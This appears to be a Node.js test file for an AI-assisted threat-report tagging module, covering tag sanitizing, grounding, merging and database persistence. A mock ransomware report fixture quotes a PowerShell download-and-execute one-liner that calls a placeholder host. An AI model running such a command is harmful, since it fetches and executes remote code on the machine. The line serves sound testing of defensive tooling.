import test from 'node:test';
import assert from 'node:assert/strict';
import {
  sanitizeAiTag,
  mergeReportTags,
  persistAiReportTags,
  persistReportIntelligence,
  buildReportTagSupport,
  isReportTagSupported,
  namedEntityTagKeys,
  REPORT_TAG_MAX,
  REPORT_TAG_CANDIDATE_MAX
} from './reportIntelligence.js';
import { validateAiAnalysis, processAiResponseText } from './ai/schema.js';
import { mergeAnalyses } from './ai/analyze.js';
import { normalizeAiAnalysisInput } from './ai/normalize.js';
import { REPORT_TAG_LINE, buildChunkPrompt, buildSynthesisPrompt } from './ai/prompts.js';

const LEGACY_EVIDENCE = 'The report states that victims received phishing emails with malicious links.';

test('sanitizeAiTag reuses space form and rejects filler / IOC-like / empty', () => {
  assert.deepEqual(sanitizeAiTag('Credential-Theft'), { ok: true, name: 'credential theft' });
  assert.deepEqual(sanitizeAiTag('  Phishing  '), { ok: true, name: 'phishing' });
  assert.equal(sanitizeAiTag('security').ok, false);
  assert.equal(sanitizeAiTag('malware').reason, 'filler');
  assert.equal(sanitizeAiTag('').reason, 'empty');
  assert.equal(sanitizeAiTag('   ').reason, 'empty');
  assert.equal(sanitizeAiTag(null).reason, 'empty');
  assert.equal(sanitizeAiTag(12).reason, 'malformed');
  assert.equal(sanitizeAiTag('CVE-2024-1234').reason, 'ioc_like');
  assert.equal(sanitizeAiTag('https://evil.example').reason, 'ioc_like');
  assert.equal(sanitizeAiTag('a'.repeat(50)).reason, 'too_long');
});

test('mergeReportTags collapses case/hyphen duplicates and ranks frequency, then first seen', () => {
  const merged = mergeReportTags([
    ['Phishing', 'credential-theft', 'finance'],
    ['phishing', 'PowerShell', 'Windows', 'cloud']
  ]);
  assert.deepEqual(merged.tags, ['phishing', 'credential theft', 'finance', 'powershell', 'windows', 'cloud']);
});

test('mergeReportTags carries at most REPORT_TAG_CANDIDATE_MAX ranked suggestions', () => {
  const many = Array.from({ length: 14 }, (_, i) => `theme ${String.fromCharCode(97 + i)}`);
  const merged = mergeReportTags([many.slice(0, 5), many.slice(5, 10), many.slice(10)]);
  assert.equal(merged.tags.length, REPORT_TAG_CANDIDATE_MAX);
  assert.equal(merged.proposed, 14);
});

test('mergeReportTags rejects filler and empty without inventing replacements', () => {
  const merged = mergeReportTags([['security', '', 'phishing', 'research']]);
  assert.deepEqual(merged.tags, ['phishing']);
  assert.ok(merged.rejected.some((r) => r.reason === 'filler'));
});

test('old analysis JSON without enrichment still validates', () => {
  const r = validateAiAnalysis({
    summary: 'legacy',
    entities: [],
    candidate_updates: [],
    relationships: []
  });
  assert.equal(r.ok, true);
  assert.deepEqual(r.value.report_tags, []);
  assert.equal('mitre_attack' in r.value, false);
});

test('malformed optional enrichment is stripped; IOC extraction still succeeds', () => {
  const r = processAiResponseText(JSON.stringify({
    summary: 'ok',
    entities: [{ entity_type: 'malware', name: 'Lynx' }],
    candidate_updates: [],
    relationships: [],
    report_tags: { not: 'an array' },
    mitre_attack: 'T1566'
  }));
  assert.equal(r.ok, true);
  assert.equal(r.value.entities[0].name, 'Lynx');
  assert.deepEqual(r.value.report_tags, []);
  assert.equal('mitre_attack' in r.value, false);
});

test('valid tags pass the AI schema; a legacy v7 mitre_attack payload is ignored, not rejected', () => {
  const r = validateAiAnalysis({
    summary: 'ok',
    entities: [],
    candidate_updates: [],
    relationships: [],
    report_tags: ['phishing', 'finance'],
    mitre_attack: [{ technique_id: 'T1566.002', evidence: LEGACY_EVIDENCE, confidence: 0.9 }]
  });
  assert.equal(r.ok, true);
  assert.deepEqual(r.value.report_tags, ['phishing', 'finance']);
  assert.equal('mitre_attack' in r.value, false);
  assert.ok(r.normalization_notes.includes('ignored_legacy_mitre_attack'));
});

test('chunk merge collapses duplicate tags and drops legacy MITRE proposals', () => {
  const legacy = [{ technique_id: 'T1566.002', evidence: LEGACY_EVIDENCE, confidence: 0.95 }];
  const merged = mergeAnalyses([
    { summary: 'a', entities: [], candidate_updates: [], relationships: [], report_tags: ['Phishing'], mitre_attack: legacy },
    { summary: 'b', entities: [], candidate_updates: [], relationships: [], report_tags: ['phishing', 'finance'], mitre_attack: legacy }
  ]);
  assert.equal(merged.ok, true);
  assert.deepEqual(merged.value.report_tags, ['phishing', 'finance']);
  assert.equal('mitre_attack' in merged.value, false);
});

test('empty tags are valid and no mitre_attack field is defaulted', () => {
  const n = normalizeAiAnalysisInput({ summary: 'only summary', confidence: 0.5 });
  assert.deepEqual(n.value.report_tags, []);
  assert.equal('mitre_attack' in n.value, false);
});

function mockDb(state) {
  return {
    query: async (sql, params) => {
      const s = String(sql);
      state.sql?.push(s);
      if (/FROM tags WHERE name = \$1 OR slug = \$2/.test(s)) {
        const hit = state.tags.find((t) => t.name === params[0] || t.slug === params[1]);
        return { rows: hit ? [hit] : [] };
      }
      if (/FROM tags WHERE name = \$1 LIMIT 1/.test(s)) {
        const hit = state.tags.find((t) => t.name === params[0]);
        return { rows: hit ? [hit] : [] };
      }
      if (/INSERT INTO tags /.test(s)) {
        if (state.tags.some((t) => t.name === params[0])) {
          const err = new Error('duplicate');
          err.code = '23505';
          throw err;
        }
        const row = {
          id: state.nextId++,
          name: params[0],
          slug: params[1],
          type: params[2],
          category: params[3],
          enabled: true,
          created_origin: params[7]
        };
        state.tags.push(row);
        return { rows: [row] };
      }
      if (/INSERT INTO threat_report_tags/.test(s)) {
        const key = `${params[0]}:${params[1]}`;
        if (state.links.has(key)) return { rowCount: 0 };
        state.links.add(key);
        return { rowCount: 1 };
      }
      return { rows: [], rowCount: 0 };
    }
  };
}

test('AI tags create and link three new catalog tags', async () => {
  const state = { tags: [], links: new Set(), nextId: 10 };
  const stats = await persistAiReportTags(mockDb(state), 1, ['phishing', 'credential theft', 'finance']);
  assert.equal(stats.created, 3);
  assert.equal(stats.linked, 3);
  assert.equal(state.tags.length, 3);
});

test('existing tag with different casing is reused', async () => {
  const state = {
    tags: [{ id: 3, name: 'phishing', slug: 'phishing', type: 'context', enabled: true }],
    links: new Set(),
    nextId: 10
  };
  const stats = await persistAiReportTags(mockDb(state), 1, ['Phishing']);
  assert.equal(stats.reused, 1);
  assert.equal(stats.created, 0);
  assert.equal(state.tags.length, 1);
});

test('duplicate AI tags create one link', async () => {
  const state = { tags: [], links: new Set(), nextId: 10 };
  const stats = await persistAiReportTags(mockDb(state), 1, ['phishing', 'Phishing', 'phishing']);
  assert.equal(stats.accepted, 3);
  assert.equal(state.links.size, 1);
});

test('re-analysis does not duplicate report-tag links', async () => {
  const state = { tags: [], links: new Set(), nextId: 10 };
  const db = mockDb(state);
  await persistAiReportTags(db, 1, ['phishing']);
  const again = await persistAiReportTags(db, 1, ['phishing']);
  assert.equal(state.links.size, 1);
  assert.equal(again.already_linked, 1);
});

test('manually existing report tag survives AI analysis', async () => {
  const state = {
    tags: [
      { id: 1, name: 'microsoft 365', slug: 'microsoft-365', type: 'context', enabled: true },
      { id: 2, name: 'phishing', slug: 'phishing', type: 'context', enabled: true }
    ],
    links: new Set(['1:1']),
    nextId: 10
  };
  await persistAiReportTags(mockDb(state), 1, ['phishing']);
  assert.ok(state.links.has('1:1'));
  assert.ok(state.links.has('1:2'));
});

test('concurrent tag create race reuses the winner', async () => {
  const state = { tags: [], links: new Set(), nextId: 10 };
  const db = mockDb(state);
  const first = db.query.bind(db);
  let inserts = 0;
  db.query = async (sql, params) => {
    if (/INSERT INTO tags /.test(String(sql))) {
      inserts += 1;
      if (inserts === 1) {
        state.tags.push({
          id: 99, name: params[0], slug: params[1], type: 'context', enabled: true
        });
        const err = new Error('duplicate');
        err.code = '23505';
        throw err;
      }
    }
    return first(sql, params);
  };
  const stats = await persistAiReportTags(db, 1, ['phishing']);
  assert.equal(stats.created, 0);
  assert.equal(stats.reused, 1);
  assert.equal(state.tags.filter((t) => t.name === 'phishing').length, 1);
});

test('report intelligence persist never touches threat_report_mitre_mappings, even for a legacy payload', async () => {
  const state = { tags: [], links: new Set(), nextId: 10, sql: [] };
  const diag = await persistReportIntelligence(
    mockDb(state),
    4,
    { report_tags: ['phishing'], mitre_attack: [{ technique_id: 'T1566', evidence: LEGACY_EVIDENCE, confidence: 0.99 }] },
    { log: { info: () => {}, warn: () => {} } }
  );
  assert.equal(diag.tags_accepted, 1);
  assert.equal(state.links.size, 1);
  assert.equal(state.sql.some((q) => /mitre/i.test(q)), false);
  assert.equal(Object.keys(diag).some((k) => /mitre/i.test(k)), false);
});

// --- Salience / grounding contract -------------------------------------------

function doc(title, paragraphs, language = 'en') {
  return {
    title,
    language,
    blocks: [
      { id: 'b0', type: 'heading', text: title },
      ...paragraphs.map((text, i) => ({ id: `b${i + 1}`, type: 'paragraph', text }))
    ]
  };
}

const RANSOMWARE_DOC = doc('Ransomware Campaign Targets Telecommunications Providers', [
  'The ransomware operators breached two telecommunications providers and a water utility.',
  'Initial access came through exploitation of an internet-facing collaboration server.',
  'The attackers abused a vulnerable signed driver to disable security products before deployment.',
  'One host ran: powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString(\'http://x/a\')"',
  'The ransomware payload was distributed to every domain host through a Group Policy share.',
  'Victims included critical infrastructure operators in Europe and Asia.'
]);

test('a tag the report never discusses is rejected (copied from instructions / general knowledge)', () => {
  const support = buildReportTagSupport(RANSOMWARE_DOC);
  assert.equal(support.applies, true);
  assert.equal(isReportTagSupported('banking', support), false);
  assert.equal(isReportTagSupported('phishing', support), false);
  // One word of a two-word concept is not the concept: "credential" alone is not "credential theft".
  assert.equal(isReportTagSupported('credential theft', support), false);
  const merged = mergeReportTags([['ransomware', 'banking', 'phishing', 'powershell']], { support });
  assert.deepEqual(merged.tags, ['ransomware', 'powershell']);
  assert.deepEqual(
    merged.rejected.filter((r) => r.reason === 'unsupported').map((r) => r.value),
    ['banking', 'phishing']
  );
});

test('grounding tolerates inflection and spacing, never synonyms', () => {
  const support = buildReportTagSupport(doc('Report', [
    'The actor is exploiting SharePoint servers of telecom operators and water utilities.',
    'It sideloads a DLL and steals credentials from Office 365 tenants. Living off the land binaries were used.'
  ]));
  assert.equal(isReportTagSupported('sharepoint exploitation', support), true);
  assert.equal(isReportTagSupported('telecommunications', support), true);
  assert.equal(isReportTagSupported('water utility', support), true);
  assert.equal(isReportTagSupported('dll sideloading', support), true);
  assert.equal(isReportTagSupported('living off the land', support), true);
  assert.equal(isReportTagSupported('office365', support), true);
  assert.equal(isReportTagSupported('credential theft', support), false);
  assert.equal(isReportTagSupported('critical infrastructure', support), false);
});

test('grounding does not apply to non-English reports (concepts may be named in English)', () => {
  const support = buildReportTagSupport(doc('攻击链分析', ['该组织利用伪装安装包植入远控木马。'], 'zh'));
  assert.equal(support.applies, false);
  assert.deepEqual(
    mergeReportTags([['espionage', 'remote access trojan']], { support }).tags,
    ['espionage', 'remote access trojan']
  );
  const unknownLatin = buildReportTagSupport({ ...doc('Report', ['ransomware hits hospitals']), language: null });
  assert.equal(unknownLatin.applies, true);
  assert.equal(isReportTagSupported('banking', unknownLatin), false);
});

test('a theme several chunks carry outranks a one-chunk incidental tool mention', () => {
  const merged = mergeAnalyses([
    { summary: 'a', entities: [], candidate_updates: [], relationships: [], report_tags: ['ransomware', 'telecommunications', 'critical infrastructure'] },
    { summary: 'b', entities: [], candidate_updates: [], relationships: [], report_tags: ['powershell', 'ransomware', 'banking'] }
  ], { tagSupport: buildReportTagSupport(RANSOMWARE_DOC) });
  assert.equal(merged.ok, true);
  const tags = merged.value.report_tags;
  assert.equal(tags[0], 'ransomware');
  assert.ok(tags.indexOf('powershell') > tags.indexOf('telecommunications'));
  assert.equal(tags.includes('banking'), false);
});

test('provider-style Qwen tag output (mixed case, hyphens) parses, validates and normalizes', () => {
  const r = processAiResponseText(JSON.stringify({
    summary: 'ok', entities: [], candidate_updates: [], relationships: [],
    report_tags: ['Critical-Infrastructure', 'SharePoint exploitation', 'BYOVD', 'telecommunications', 'water utility']
  }));
  assert.equal(r.ok, true);
  assert.deepEqual(mergeReportTags([r.value.report_tags]).tags, [
    'critical infrastructure', 'sharepoint exploitation', 'byovd', 'telecommunications', 'water utility'
  ]);
});

test('persistence links at most REPORT_TAG_MAX tags, in rank order', async () => {
  const state = { tags: [], links: new Set(), nextId: 10 };
  const names = ['a1 theme', 'b2 theme', 'c3 theme', 'd4 theme', 'e5 theme', 'f6 theme', 'g7 theme'];
  const stats = await persistAiReportTags(mockDb(state), 1, names);
  assert.equal(state.links.size, REPORT_TAG_MAX);
  assert.equal(stats.accepted, REPORT_TAG_MAX);
  assert.deepEqual(stats.rejected.map((r) => [r.value, r.reason]), [['f6 theme', 'over_limit'], ['g7 theme', 'over_limit']]);
});

test('a disabled catalog tag (retired into Threat Classifications) does not use a slot', async () => {
  const state = {
    tags: [{ id: 1, name: 'ransomware', slug: 'ransomware', type: 'threat', enabled: false }],
    links: new Set(),
    nextId: 10
  };
  const names = ['ransomware', 'critical infrastructure', 'telecommunications', 'water utility', 'sharepoint exploitation', 'byovd'];
  const stats = await persistAiReportTags(mockDb(state), 7, names);
  assert.equal(stats.accepted, REPORT_TAG_MAX);
  assert.equal(state.links.size, REPORT_TAG_MAX);
  assert.equal(state.links.has('7:1'), false);
  assert.deepEqual(stats.rejected, [{ value: 'ransomware', reason: 'tag_disabled' }]);
});

test('analyst-added report tags survive AI persistence and do not count toward the AI limit', async () => {
  const state = {
    tags: [{ id: 1, name: 'analyst pick', slug: 'analyst-pick', type: 'context', enabled: true }],
    links: new Set(['3:1']),
    nextId: 10
  };
  await persistAiReportTags(mockDb(state), 3, ['t1 theme', 't2 theme', 't3 theme', 't4 theme', 't5 theme']);
  assert.ok(state.links.has('3:1'));
  assert.equal(state.links.size, 6);
});

test('a tag naming an actor / malware / campaign / tool entity stays an entity; products and sectors stay taggable', () => {
  const doc8 = doc('Exploitation Delivers a Router RAT', [
    'The RouterRat implant was deployed after exploitation of FortiGate appliances.',
    'Telecommunications operators running FortiGate were affected; the RouterRat C2 used a Node.js reverse shell.'
  ]);
  const merged = mergeAnalyses([
    {
      summary: 'a', candidate_updates: [], relationships: [],
      entities: [
        { entity_type: 'malware', name: 'RouterRat', aliases: ['Router-RAT'] },
        { entity_type: 'organization', name: 'FortiGate' }
      ],
      report_tags: ['RouterRat', 'FortiGate exploitation', 'router rat']
    },
    {
      summary: 'b', candidate_updates: [], relationships: [], entities: [],
      report_tags: ['Router-RAT', 'telecommunications', 'FortiGate']
    }
  ], { tagSupport: buildReportTagSupport(doc8) });
  assert.equal(merged.ok, true);
  assert.deepEqual(merged.value.report_tags, ['fortigate exploitation', 'telecommunications', 'fortigate']);
  assert.deepEqual(
    namedEntityTagKeys([{ entity_type: 'threat_actor', name: 'Storm-0001', aliases: ['Longteeth'] }, { entity_type: 'vulnerability', name: 'CVE-2099-0001' }]),
    new Set(['storm 0001', 'longteeth'])
  );
});

test('the tag instruction defines salience and offers no example tag vocabulary to copy', () => {
  // semantic-v8 listed example tags; qwen3.5:9b copied them into unrelated reports.
  for (const word of ['phishing', 'credential theft', 'ransomware', 'powershell', 'banking', 'windows', 'cloud', 'c2', 'infostealer']) {
    assert.equal(new RegExp(`\\b${word}\\b`, 'i').test(REPORT_TAG_LINE), false, `example tag "${word}" in the tag instruction`);
  }
  assert.match(REPORT_TAG_LINE, /WHOLE REPORT/);
  assert.match(REPORT_TAG_LINE, /title, section headings or key findings/);
  assert.match(REPORT_TAG_LINE, /only in passing \(one command line/);
  assert.match(REPORT_TAG_LINE, /never add one from general knowledge or copy words from these instructions/);
  assert.match(REPORT_TAG_LINE, /threat actors, malware families, campaigns or tools \(those are entities\)/);
  const chunk = buildChunkPrompt({
    documentTitle: 'Doc', language: 'en', chunkIndex: 1, chunkTotal: 2,
    blocksText: 'body', blockIds: ['b0'], toClassify: [], resolved: []
  });
  assert.ok(chunk.includes(REPORT_TAG_LINE));
  assert.match(chunk, /except report_tags: they describe the whole report/);
  assert.ok(buildSynthesisPrompt({ documentTitle: 'Doc', partialsText: '[]' }).includes(REPORT_TAG_LINE));
});
